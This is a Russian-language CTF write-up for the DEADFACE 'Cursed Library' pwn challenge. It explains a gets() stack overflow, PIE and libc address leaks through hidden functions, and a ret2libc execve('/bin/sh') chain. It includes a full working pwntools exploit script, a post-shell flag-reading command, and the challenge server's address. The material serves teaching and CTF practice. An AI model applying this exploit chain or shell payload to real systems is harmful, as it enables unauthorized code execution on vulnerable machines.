# Cursed Library — Writeup

Oct 18, 2026 · @Demian

Pwn-таск DEADFACE CTF (ret2libc). Бинарь PIE + NX, **без канарейки**. Утечка базы PIE через скрытую функцию `BookOfTheDead`, утечка libc через `Necronomicon`, затем переполнение `gets` в `checkout` → ret2libc (`execve("/bin/sh",0,0)`) → shell. Флаг: `deadface{T#3_L1br4ry_Kn0w5_A11}`.

## Задача и защиты

Дан 64-битный ELF `Cursed_Library` (тематика «Некрономикона»/Evil Dead) и рядом — `libc.so.6` с `ld-linux-x86-64.so.2`. Приложенная libc — прямая подсказка: цель — ret2libc, а libc дана, чтобы оффсеты совпали с сервером.

`checksec` показал:

| Защита | Статус | Что это значит для нас |
| --- | --- | --- |
| RELRO | Partial | GOT частично перезаписываем, но нам не нужен |
| Stack canary | **Нет** | переполнение через `gets` ничем не прикрыто |
| NX | Включён | шелл-код на стеке нельзя → только ROP / ret2libc |
| PIE | Включён | нужна утечка адреса (есть «подарочная» функция) |
| Stripped | Нет | символы на месте — удобно читать |

Итог: классический ret2libc. Нет канарейки → свободно перезаписываем адрес возврата; NX → нужен возврат в существующий код; PIE → сначала утечём адреса.

## Разбор программы

`main` выводит ASCII-арт и крутит меню из трёх пунктов: `1) peruse` (листинг файлов через `opendir(".")`), `2) checkout` (чтение «книги»), `3) leave` (выход). Вся логика — в `checkout`.

```c
void checkout() {
    char buf[0x60];                       // rbp-0x60
    puts("Which book do you dare open?");
    printf("> ");
    gets(buf);                            // <-- УЯЗВИМОСТЬ: без границ

    if (strcmp(buf, "Necronomicon.txt") == 0) return reject;  // точное имя
    if (strchr(buf, '/'))                   return reject;     // нет путей
    if (strstr(buf, ".."))                  return reject;     // нет traversal

    if (strcmp(buf, "BookOfTheDead") == 0) { puts(...); BookOfTheDead(); return; }

    FILE *f = fopen(buf, "r");            // иначе — открыть файл
    if (!f) { printf("...book called '%s'...", buf); return; }
    for (int c = fgetc(f); c != EOF; c = fgetc(f)) putchar(c);  // и распечатать
    fclose(f);
}
```

Фильтр имени блокирует дословно `Necronomicon.txt`, любой `/` и любой `..` — то есть прочитать флаг «в лоб» через `fopen` нельзя. `peruse` показал, что в текущем каталоге флага нет (только `ld`, `libc.so.6`, сам бинарь) — значит логического чтения файла недостаточно, нужен pwn. Важно: все ветки `checkout` сходятся в `leave; ret`, поэтому фильтр не мешает переполнению — перезаписанный адрес возврата срабатывает в любом случае.

## Уязвимость и смещение

`gets(buf)` читает до `\n` без ограничения длины — классическое переполнение стека. Буфер лежит по `rbp-0x60`.

Смещение до сохранённого адреса возврата:

```
buf до saved rbp : 0x60 = 96 байт
saved rbp         : 8 байт
-------------------------------
offset до RIP     : 104 байт
```

Проверка в gdb: на `ret` функции `rbp=0x...d4e0`, saved RIP лежит по `0x...d4e8`, а `buf = rbp-0x60 = 0x...d480`. Разница `0xd4e8 - 0xd480 = 0x68 = 104`. Канарейки нет, поэтому после 104 байт «мусора» сразу идёт наш ROP. И поскольку `checkout` вызывается в цикле из `main`, переполнение можно повторять несколько раз — удобно для многоэтапной атаки (утечка → возврат в `main` → снова переполнение).

## Примитивы утечки

В бинаре две скрытые функции, которые дают обе нужные утечки даром.

**1. `BookOfTheDead` — утечка PIE.** Если в `checkout` ввести строку `BookOfTheDead`, вызывается эта функция, которая печатает `printf("...make out:  %p", &BookOfTheDead)` — то есть свой собственный адрес. Отсюда `pie_base = leak - elf.sym['BookOfTheDead']`.

**2. `Necronomicon` — утечка libc.** Эта функция читает глобал (адрес `_IO_puts` в libc) и печатает `printf("...puts(): %p", puts_libc)`. Аргументов не требует — берёт адрес из глобала. Это ключевой момент: `Necronomicon` **не вызывается из меню**, но его можно достичь переполнением — просто вернуть RIP на `Necronomicon`.

Именно второй примитив снимает главную головную боль: обычно для утечки libc нужен гаджет `pop rdi` (чтобы позвать `puts(puts@got)`), а в этом бинаре чистого `pop rdi; ret` нет. `Necronomicon` печатает libc-адрес сам, без единого гаджета.

Схема двух утечек:

1. `checkout` → ввод `BookOfTheDead` → читаем `%p` → `pie_base`.
2. переполнение `A*104 + Necronomicon + main` → функция печатает `puts(): %p` → `libc_base`, и возврат в `main` возобновляет меню для следующего захода.

База libc считается по `_IO_puts` (глобал держит именно его; `puts` может быть IFUNC с другим оффсетом): `libc.address = leak - libc.sym['_IO_puts']`. Оффсет сошёлся — `0x82060`.

## Эксплуатация и подводные камни

После двух утечек есть `pie_base` и `libc_base`. Финальный заход в `checkout` — ret2libc на гаджетах из libc (в бинаре гаджетов нет, в libc есть `pop rdi; ret` и т.д.). По дороге встретились три грабли.

**Грабли 1 — запуск локально.** `LD_PRELOAD` приложенной libc поверх системного `ld` падает (несовпадение версий). Решение — запускать через приложенный `ld`: `process(['./ld-linux-x86-64.so.2', './Cursed_Library'], env={'LD_LIBRARY_PATH': '.'})`. Бинарь при этом ложится по высокому адресу `0x7f...` — нормально, все оффсеты относительные.

**Грабли 2 — `system` падал.** Цепочка `ret + pop_rdi + binsh + system` давала `*** stack smashing detected ***`. Причина — выравнивание: лишний `ret` сдвигал вход `system` на 8 байт, `do_system` ловил `movaps`/сбой. Диагностика `puts("/bin/sh")` показала, что `pop_rdi`, строка и база верны — виноват именно `system`.

**Грабли 3 — `system` всё равно не давал shell.** Даже с верным выравниванием `do_system` делает `fork`+`sh -c`, и в связке с запуском через явный `ld` дочерний процесс вёл себя криво. **Решение — `execve("/bin/sh", 0, 0)`**: заменяет образ процесса напрямую, без `fork`/`sh -c`. Цепочку (`pop rdi` / `pop rsi` / `pop rdx` + `execve`) собирает сам pwntools через `ROP(libc)` — гаджеты в libc есть, выравнивание он разрулит сам.

Это и стало рабочим финалом — `execve` выдал чистый интерактивный shell и локально, и на сервере.

## Полный эксплойт

```python
#!/usr/bin/env python3
# Cursed_Library — ret2libc
from pwn import *

context.binary = elf = ELF('./Cursed_Library', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
PAD = 104

def start():
    if args.REMOTE:                       # python3 exploit.py REMOTE HOST=.. PORT=..
        return remote(args.HOST, int(args.PORT))
    # локально — через приложенный ld (LD_PRELOAD поверх системного ld падает)
    return process(['./ld-linux-x86-64.so.2', './Cursed_Library'], env={'LD_LIBRARY_PATH': '.'})

io = start()
def menu(c): io.recvuntil(b'> '); io.sendline(str(c).encode())
def book(d): io.recvuntil(b'> '); io.sendline(d)

# 1) leak PIE: checkout -> "BookOfTheDead" печатает свой адрес
menu(2); book(b'BookOfTheDead')
io.recvuntil(b'make out:  ')
elf.address = int(io.recvline().strip(), 16) - elf.sym['BookOfTheDead']
log.success(f'PIE  @ {elf.address:#x}')

# 2) leak libc: overflow -> Necronomicon (печатает _IO_puts@libc) -> main
payload = b'A'*PAD + p64(elf.sym['Necronomicon']) + p64(elf.sym['main'])
menu(2); book(payload)
io.recvuntil(b'puts(): ')
import re
puts_libc = int(re.search(rb'0x[0-9a-f]+', io.recvline()).group(), 16)
libc.address = puts_libc - (libc.symbols.get('_IO_puts') or libc.symbols['puts'])
log.success(f'libc @ {libc.address:#x}')

# 3) shell: overflow -> execve("/bin/sh", 0, 0) — цепочку собирает ROP(libc)
binsh = next(libc.search(b'/bin/sh\x00'))
rop = ROP(libc)
rop.execve(binsh, 0, 0)
menu(2); book(b'A'*PAD + rop.chain())

io.sendline(b'id; ls -la; cat flag* /flag* ~/flag* 2>/dev/null')
io.interactive()
```

Запуск: `python3 exploit.py` локально, `python3 exploit.py REMOTE HOST=159.65.228.107 PORT=5004` на сервер. Флаг: **`deadface{T#3_L1br4ry_Kn0w5_A11}`**.

Уроки: (1) скрытые функции, которые сами печатают адреса, снимают нужду в гаджетах для утечки; (2) если PIE-стадии работают, а первое обращение к libc падает — виновата `libc.address`; (3) `system` капризен (выравнивание + `fork`/`sh -c`) — `execve` надёжнее.
